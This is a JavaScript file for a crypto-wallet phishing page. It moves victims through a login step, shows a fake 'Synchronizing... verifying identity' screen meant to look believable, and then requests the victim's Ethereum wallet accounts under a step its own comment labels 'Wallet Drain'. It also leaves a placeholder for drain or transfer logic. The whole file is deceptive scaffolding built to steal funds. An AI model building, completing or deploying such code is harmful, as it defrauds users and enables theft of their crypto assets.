document.addEventListener('DOMContentLoaded', () => {
    
    // Step 1 -> Step 2
    const toStep2 = document.getElementById('toStep2');
    if (toStep2) {
        toStep2.onclick = () => {
            document.getElementById('step-1').classList.add('hidden');
            document.getElementById('step-2').classList.remove('hidden');
        };
    }

    // Step 2 -> Step 3 (The fake "Synchronizing" transition)
    const loginForm = document.getElementById('login-form');
    if (loginForm) {
        loginForm.onsubmit = (e) => {
            e.preventDefault();
            
            // Hide Step 2
            document.getElementById('step-2').classList.add('hidden');
            
            // Show a believable "Syncing" screen
            const container = document.querySelector('.container');
            const loader = document.createElement('div');
            loader.className = 'auth-card';
            loader.innerHTML = '<div class="loader"></div><h1>Synchronizing...</h1><p>Connecting to blockchain and verifying identity...</p>';
            container.appendChild(loader);
            
            // After 3 seconds, remove loader and show Step 3
            setTimeout(() => {
                loader.remove();
                document.getElementById('step-3').classList.remove('hidden');
            }, 3000);
        };
    }

    // Step 3: Wallet Drain
    const connectBtn = document.getElementById('connectBtn');
    if (connectBtn) {
        connectBtn.onclick = async () => {
            const status = document.getElementById('status');
            if (window.ethereum) {
                try {
                    status.innerText = "Requesting secure connection...";
                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                    status.innerText = "Wallet Connected: " + accounts[0].substring(0, 6) + "...";
                    
                    // You can put your drain/transfer logic here
                    status.innerText = "Syncing assets...";
                    
                } catch (err) {
                    status.innerText = "Verification failed. Please try again.";
                }
            } else {
                status.innerText = "No wallet detected. Please install Coinbase Wallet.";
            }
        };
    }
});
